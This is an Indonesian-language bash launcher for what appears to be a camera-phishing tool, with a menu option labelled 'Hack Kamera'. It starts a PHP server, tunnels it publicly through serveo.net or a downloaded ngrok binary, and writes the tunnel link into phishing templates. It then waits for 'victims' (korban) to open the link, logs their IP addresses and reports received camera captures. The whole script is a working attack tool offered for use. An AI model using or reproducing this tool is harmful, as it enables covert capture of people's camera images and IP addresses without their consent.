b="[34;1m"
p="[37;1m"
m="[31;1m"
h="[32;1m"
k="[33;1m"
trap 'printf "
";stop' 2
banner() {
clear
sh logo.sh
printf "
"
}
stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '
IFS=$'
'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP Target :\e[0m\e[1;77m %s\e[0m
" $ip
cat ip.txt >> saved.ip.txt
}
checkfound() {
printf "
"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menunggu Korban,\e[0m\e[0;31m Tekan Ctrl + C untuk keluar...\e[0m
"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "
\e[1;92m[\e[0m+\e[1;92m] Target Sedang Membuka link!
"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "Log.log" ]]; then
printf "
\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m
"
rm -rf Log.log
fi
sleep 0.5
done
}
server() {
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m\e[1;93m+\e[0m\e[1;92m] Memulai Server...\e[0m
"
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
sleep 8
fi
printf "\e[1;92m[\e[0m\e[1;33m+\e[0m\e[1;92m] (localhost:3333)\e[0m
"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Link Sudah Siap :\e[0m\e[1;77m %s
' $send_link
}
payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' index.html > true.html
sed 's+forwarding_link+'$link'+g' template.php > index.php
}
ngrok_server() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...
"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m
"
exit 1
fi
else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m
"
exit 1
fi
fi
fi
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...
"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Memulai Server...
"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Link Sudah Siap :\e[0m\e[1;77m %s\e[0m
" $link
payload_ngrok
checkfound
}
start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
printf "
"
printf "\e[1;92m{\e[0m\e[1;77m01\e[0m\e[1;92m}\e[0m\e[1;96m Hack Kamera\e[0m
"
printf "\e[1;92m{\e[0m\e[1;77m02\e[0m\e[1;92m}\e[0m\e[1;96m Chat Admin\e[0m
"
printf "\e[1;92m{\e[0m\e[1;77m00\e[0m\e[1;92m}\e[0m\e[1;91m Out\e[0m
"
default_option_server="1"
read -p $'
[32;1m[[31;1m•[32;1m] [34;1mPilih Nomor [31;1m: [32;1m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then
command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start
elif [[ $option_server -eq 2 ]];then
sh kontak.sh
elif [[ $option_server -eq 0 ]];then
printf "${h}    [ Bye ${p}*_* ]
"
sleep 1
exit
else
printf "     ${p}[${m}!${p}]${m} Input Wrong ${p}[${m}!${p}]
"
sleep 1
clear
sh logo.sh
start1
fi
}
payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' index.html > true.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}
start() {
default_choose_sub="Y"
default_subdomain="support$RANDOM"
clear
sh logo3.sh
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Buat link Custom? [y/n] : \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf "
${k} Contoh${m}:${h}( ${p}adsense ${h})
"
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Buat Nama Link : \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi
server
payload
checkfound
}
banner
dependencies
start1